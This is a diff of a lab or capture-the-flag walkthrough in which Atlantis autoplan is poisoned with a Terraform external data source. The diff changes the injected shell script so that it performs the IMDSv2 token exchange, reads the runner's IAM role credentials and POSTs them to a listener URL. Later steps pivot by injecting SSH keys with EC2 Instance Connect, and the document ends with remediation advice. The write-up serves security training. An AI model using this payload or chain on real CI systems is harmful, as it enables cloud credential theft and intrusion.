@@ -12,17 +12,11 @@ cd terraform
 terraform output gitlab_server_url
 ```
 
-Open the URL in your browser. You will see the GitLab CE login page.
-
-![infra-repo overview](./images/gitlab-infra-repo.png)
-
-Log in with:
-- **Username:** `000_ops`
-- **Password:** `BeaverPassword123!`
+Open the URL in your browser. You will see the GitLab CE login page. Log in with:
+- **Username:** `platform`
+- **Password:** `BvrOps@2024`
 
 Navigate to the `infra-repo` repository and open `atlantis.yaml`.
-
-![atlantis.yaml](./images/gitlab-atlantis-yaml.png)
 
 Key finding:
 
@@ -34,7 +28,7 @@ apply_requirements: [approved]   # apply requires approval, but plan does not
 
 **Critical misconfiguration:** `autoplan.enabled: true` means Atlantis will execute `terraform plan` automatically on any Merge Request that modifies a `.tf` file — with no review, no approval, and no human in the loop. The `apply_requirements: [approved]` guard only protects `apply`, not `plan`. Since `terraform plan` can execute arbitrary code via `external` data sources, this is a full code execution primitive on the Atlantis runner.
 
-> **Note:** The Atlantis runner has an IAM role attached. When `terraform plan` runs the `external` data source program, it executes with the runner's IAM credentials, and IMDSv1 is accessible at `169.254.169.254` with no token requirement.
+> **Note:** The Atlantis runner has an IAM role attached. When `terraform plan` runs the `external` data source program, it executes directly on the runner — as if you had shell access. The instance enforces IMDSv2, but that only blocks SSRF-style attacks from an external host. Code running on the instance itself can complete the IMDSv2 token exchange and retrieve the attached role's credentials.
 
 ## Step 2: Pipeline Poisoning
 
@@ -43,7 +37,7 @@ Set up a listener to receive the exfiltrated credentials. Use [webhook.site](htt
 Clone the repository and create an exploit branch:
 
 ```bash
-git clone http://000_ops:BeaverPassword123!@<GITLAB_IP>/000_ops/infra-repo.git
+git clone http://platform:BvrOps%402024@<GITLAB_IP>/platform/infra-repo.git
 cd infra-repo
 git checkout -b exploit/steal-creds
 ```
@@ -53,8 +47,12 @@ Append the following block to `main.tf`. Replace `<YOUR_LISTENER_URL>` with your
 ```hcl
 data "external" "steal_creds" {
   program = ["sh", "-c", <<-EOT
-    ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-    CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
+    TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+    ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+    CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
     curl -s -X POST "<YOUR_LISTENER_URL>" \
       -H "Content-Type: application/json" \
       -d "$CREDS" > /dev/null 2>&1
@@ -64,7 +62,9 @@ data "external" "steal_creds" {
 }
 ```
 
-> **Note:** The `> /dev/null 2>&1` redirect on the `curl` POST is critical. Without it, the HTTP response body from your listener is written to stdout. Terraform parses the stdout of an `external` data source program as JSON and expects a flat string map. If the listener returns any HTML or non-JSON body, Terraform fails with `invalid character '<' looking for beginning of value` and the plan errors out before the credentials are sent.
+> **Note (IMDSv2):** The Atlantis runner is self-hosted on EC2 and enforces IMDSv2 (`http_tokens = "required"`). A direct `GET` to `169.254.169.254` returns `401 Unauthorized`. You must first `PUT` to obtain a session token, then include it as `X-aws-ec2-metadata-token` on subsequent requests. This is not a blocker — unlike SSRF attacks that target IMDS from an *external* server, code executing *directly on the instance* can complete the two-step exchange without restriction.
+
+> **Note (stdout redirect):** The `> /dev/null 2>&1` redirect on the `curl` POST is critical. Without it, the HTTP response body from your listener lands on stdout. Terraform parses the stdout of an `external` data source program as JSON and expects a flat string map. If the listener returns any HTML or non-JSON body, Terraform fails with `invalid character '<' looking for beginning of value` and the plan errors out before the credentials are sent.
 
 Commit and push the branch:
 
@@ -76,19 +76,11 @@ git push origin exploit/steal-creds
 
 Open a Merge Request via the GitLab UI: `exploit/steal-creds → main`.
 
-![Open MR](./images/gitlab-open-mr.png)
-
 Within seconds of the MR being opened, Atlantis detects the `.tf` change and automatically runs `terraform plan`. Atlantis posts a comment on the MR confirming the plan was triggered.
-
-![Atlantis plan triggered](./images/atlantis-plan-triggered.png)
 
 ## Step 3: Capturing IAM Credentials
 
-Check your listener. Atlantis will POST the Atlantis runner's IAM credentials to your endpoint during the `terraform plan` execution:
-
-![Webhook received credentials](./images/webhook-credentials.png)
-
-The JSON payload has this structure:
+Check your listener. Atlantis will POST the Atlantis runner's IAM credentials to your endpoint during the `terraform plan` execution. The JSON payload has this structure:
 
 ```json
 {
@@ -147,7 +139,7 @@ Extract the role name:
 ROLE_NAME=$(aws sts get-caller-identity \
   --query 'Arn' --output text | cut -d'/' -f2)
 echo $ROLE_NAME
-# gnawlab-cicd-eic-atlantis-role-<scenario_id>
+# cicd-eic-pivot-atlantis-role-<scenario_id>
 ```
 
 ### 4.2 List Inline Policies
@@ -161,7 +153,7 @@ Expected output:
 ```json
 {
     "PolicyNames": [
-        "gnawlab-cicd-eic-atlantis-policy-<scenario_id>"
+        "cicd-eic-pivot-atlantis-policy-<scenario_id>"
     ]
 }
 ```
@@ -171,7 +163,7 @@ One inline policy found. Retrieve its full document:
 ```bash
 aws iam get-role-policy \
   --role-name $ROLE_NAME \
-  --policy-name gnawlab-cicd-eic-atlantis-policy-<scenario_id>
+  --policy-name cicd-eic-pivot-atlantis-policy-<scenario_id>
 ```
 
 Expected output:
@@ -194,7 +186,12 @@ Expected output:
             {
                 "Action": ["ssm:GetParameter"],
                 "Effect": "Allow",
-                "Resource": "arn:aws:ssm:us-east-1:123456789012:parameter/gnawlab-cicd-eic-*/atlantis-gitlab-token"
+                "Resource": "arn:aws:ssm:us-east-1:123456789012:parameter/cicd-eic-pivot-*/atlantis-gitlab-token"
+            },
+            {
+                "Action": ["iam:ListRolePolicies", "iam:GetRolePolicy", "iam:ListAttachedRolePolicies"],
+                "Effect": "Allow",
+                "Resource": "arn:aws:iam::123456789012:role/cicd-eic-pivot-atlantis-role-*"
             }
         ]
     }
@@ -248,7 +245,7 @@ Stolen IAM Role Credentials
 │     → Valid attack path ✓ ← CHOSEN
 ```
 
-**Why SSM is a dead end:** The `ssm:GetParameter` permission is scoped to the Atlantis GitLab token. Retrieving it gives you the same GitLab access you already have as `000_ops`. No new lateral movement.
+**Why SSM is a dead end:** The `ssm:GetParameter` permission is scoped to the Atlantis GitLab token. Retrieving it gives you the same GitLab access you already have as `platform`. No new lateral movement.
 
 **Why EC2 Instance Connect is the pivot:** `SendSSHPublicKey` on `Resource: "arn:aws:ec2:*:*:instance/*"` means we can inject an SSH key onto **any EC2 instance in this account** running as `ubuntu`. This is the overprivilege that opens the attack path forward.
 
@@ -270,10 +267,10 @@ Expected output:
 ---------------------------------------------------------------------
 |                       DescribeInstances                           |
 +----------------------+---------------+---------------+----------------------------+
-|  i-0aaa111bbb222ccc3 |  3.92.X.X     |  10.0.1.10    |  *-bastion-host-*          |
-|  i-0ddd444eee555fff6 |  None         |  10.0.2.20    |  *-target-server-*         |
-|  i-0ggg777hhh888iii9 |  54.80.X.X    |  10.0.1.30    |  *-gitlab-server-*         |
-|  i-0jjj000kkk111lll2 |  18.X.X.X     |  10.0.1.40    |  *-atlantis-runner-*       |
+|  i-0aaa111bbb222ccc3 |  3.92.X.X     |  10.0.1.7     |  *-bastion-host-*          |
+|  i-0ddd444eee555fff6 |  None         |  10.0.2.15    |  *-app-prod-*              |
+|  i-0ggg777hhh888iii9 |  54.80.X.X    |  10.0.1.20    |  *-gitlab-server-*         |
+|  i-0jjj000kkk111lll2 |  18.X.X.X     |  10.0.1.10    |  *-atlantis-runner-*       |
 +----------------------+---------------+---------------+----------------------------+
 ```
 
@@ -285,13 +282,13 @@ Four instances visible. Decide which to attack first:
 Instances found
 │
 ├── *-gitlab-server-* (public IP)
-│     Already have access as 000_ops — no new value ✗
+│     Already have access as platform — no new value ✗
 │
 ├── *-atlantis-runner-* (public IP)
 │     This is the machine whose credentials we just stole
 │     Gaining shell here adds nothing new ✗
 │
-├── *-target-server-* (NO public IP — private subnet)
+├── *-app-prod-* (NO public IP — private subnet)
 │     EIC push key → try direct SSH to private IP?
 │     → Private IP only, unreachable from internet ✗
 │     → Need a pivot point inside the VPC first
@@ -349,6 +346,8 @@ drwx------ 2 ubuntu ubuntu 4096 May  1 00:00 .ssh
 -r-------- 1 ubuntu ubuntu 1679 May  1 00:00 target-key.pem
 ```
 
+If you read `docs/adr/0003-deploy-pipeline.md` during recon, this is familiar: the original SSH deploy key that predated the EIC adoption. PLAT-1203 was supposed to clean it up. It never did.
+
 > **Note:** The Bastion Host does not have AWS CLI installed. Retrieve the Target Server's private IP from your **local machine** using the stolen credentials:
 
 ```bash
@@ -379,13 +378,13 @@ FLAG{SUPPLY_CHAIN_EIC_SUCCESS_<hex>}
 ## Attack Chain Summary
 
 ```
-1. GitLab Reconnaissance (000_ops account)
+1. GitLab Reconnaissance (platform account)
    ↓ Discover infra-repo — atlantis.yaml has autoplan.enabled: true
 2. Pipeline Poisoning
    ↓ Inject external data source into main.tf on new branch, push, open MR
 3. Atlantis autoplan triggered
    ↓ Terraform plan runs the malicious shell program on the Atlantis runner
-4. IMDSv1 Credential Theft (169.254.169.254)
+4. IMDS Credential Theft (IMDSv2 token exchange via 169.254.169.254)
    ↓ Credentials POSTed to external listener — AccessKeyId, SecretAccessKey, Token
 5. sts:GetCallerIdentity
    ↓ Confirm identity: assumed-role/atlantis-role — extract role name
@@ -396,7 +395,7 @@ FLAG{SUPPLY_CHAIN_EIC_SUCCESS_<hex>}
 8. Evaluate attack paths: S3 ✗, Secrets Manager ✗, IAM escalation ✗, SSM (dead end) ✗
    ↓ ec2-instance-connect:SendSSHPublicKey on * → chosen path
 9. ec2:DescribeInstances
-   ↓ Find bastion-host (public IP) and target-server (private subnet, no public IP)
+   ↓ Find bastion-host (public IP) and app-prod (private subnet, no public IP)
 10. Target selection: target unreachable directly → bastion is the pivot point
     ↓ EIC to bastion first
 11. ec2-instance-connect:SendSSHPublicKey → Bastion Host (60s window)
@@ -422,7 +421,7 @@ FLAG{SUPPLY_CHAIN_EIC_SUCCESS_<hex>}
 | SSRF protection | None | Token blocks most SSRF attacks |
 | Curl command | `curl http://169.254.169.254/...` | Requires `-H "X-aws-ec2-metadata-token: $TOKEN"` |
 | Terraform external data source | Exploitable directly | Requires two-step token fetch in the program |
-| Enforce via Terraform | `http_tokens = "optional"` (default, vulnerable) | `http_tokens = "required"` (safe) |
+| Enforce via Terraform | `http_tokens = "optional"` (default, vulnerable) | `http_tokens = "required"` — blocks SSRF, but **not** code execution on the instance |
 
 ### EC2 Instance Connect vs Traditional SSH Key Management
 
@@ -442,9 +441,9 @@ FLAG{SUPPLY_CHAIN_EIC_SUCCESS_<hex>}
 
 `autoplan.enabled: true` combined with `apply_requirements: [approved]` creates a false sense of security. Apply is gated, but plan is not — and `terraform plan` is arbitrary code execution on the runner via `external` data sources, `local-exec` provisioners, and provider initialization. **Fix:** Require approval on plan too, or disable autoplan and require explicit `atlantis plan` comments from authorized users.
 
-### 2. IMDS Hardening: Enforce IMDSv2
+### 2. IMDS Hardening: IMDSv2 Alone Is Not Enough
 
-IMDSv1 requires no token and is trivially accessible from any process running on the instance. Enforcing IMDSv2 (`http_tokens = "required"`) forces a PUT request to obtain a session token before credentials can be retrieved, blocking most SSRF and injected-code attacks that issue a single GET.
+Enforcing IMDSv2 (`http_tokens = "required"`) blocks SSRF-style attacks where an external server is tricked into fetching `169.254.169.254`. However, it does **not** protect against credential theft when an attacker already has code execution *on the instance* — which is exactly what `terraform plan` with an `external` data source provides. IMDSv2 is a necessary hardening step, but it does not replace the need to prevent unauthorized code execution in the first place.
 
 ### 3. Least Privilege: Scope SendSSHPublicKey to Specific Instances
 
